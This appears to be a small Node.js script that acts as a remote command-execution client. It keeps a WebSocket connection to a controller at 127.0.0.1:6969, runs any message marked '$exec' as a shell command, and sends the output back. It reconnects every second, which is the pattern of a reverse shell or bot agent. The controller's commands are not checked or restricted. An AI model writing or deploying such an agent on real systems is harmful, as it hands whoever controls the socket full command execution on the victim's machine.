const WS = require('ws')
const { exec } = require('child_process')
var connect = function(){
    var id;
    ws = new WS("ws://127.0.0.1:6969")
    ws.on("message", (message) => {
        const msg = message.toString()
        console.log(message.toString())

        const [client, operation, ...text] = msg.split(" ")
        if (operation === "$exec") { // checks if there is exec command to execute the cmd.
            console.log(text)
            cmd(text.join(" "))  
        }
    })
    ws.on("error", (error) => {
        ws.close()
    })
    ws.on("close", () => {
        setTimeout(connect, 1000)
    })

}
function cmd(cmd) {
    exec(cmd, (err, stdout, stderr) => {
        if (err) {
            ws.send(`ERORR ::: ${err}`)
            return
        } else if (stderr) {
            ws.send(`STDERR ::: ${stderr}`)
            return
        }
        console.log(stdout)
        ws.send(stdout)
    })
}


connect()